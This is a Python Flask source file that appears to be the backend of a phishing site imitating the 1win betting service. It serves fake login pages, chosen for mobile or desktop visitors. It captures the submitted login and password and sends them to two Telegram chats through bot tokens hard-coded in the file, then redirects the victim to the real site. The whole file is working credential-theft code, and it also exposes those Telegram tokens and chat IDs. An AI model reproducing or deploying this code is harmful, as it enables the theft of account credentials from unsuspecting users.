import asyncio


from flask import Flask, render_template, request, Response
from telebot import TeleBot


app = Flask(__name__)
bot = TeleBot(token='7417950461:AAFnzG0ux037zE-x6C6F6hFuf0GXPDzt2Hs', parse_mode='HTML')
bot2 = TeleBot(token='6949648306:AAEL6I0SdZSIgyGrfxYsmq0GC7zOIAhoU2s', parse_mode='HTML')


@app.route('/')
def hello_world():
    if request.args.get('login'):

        print(request.args.get('login'))# put application's code here
        print(request.args.get('password'))
        try:
            bot.send_message('-1002222131165',
                            f"Логин:<code>{request.args.get('login')}</code>\nПароль: <code>{request.args.get('password')}</code>\n\n<code>{request.args.get('login')}:{request.args.get('password')}</code>")
            bot2.send_message('-1002238325372',f"Логин:<code>{request.args.get('login')}</code>\nПароль: <code>{request.args.get('password')}</code>\n\n<code>{request.args.get('login')}:{request.args.get('password')}</code>")
        except:
            pass
            return Response(headers={'Content-Type': 'text/html', 'location': 'https://1win.com/'},status=302)
    user_agent = request.headers.get('User-Agent')
    if 'Mobile' in user_agent or 'Android' in user_agent:
            return render_template('main4.html')
    else:
        return render_template('main3.html')



if __name__ == '__main__':
    app.run()
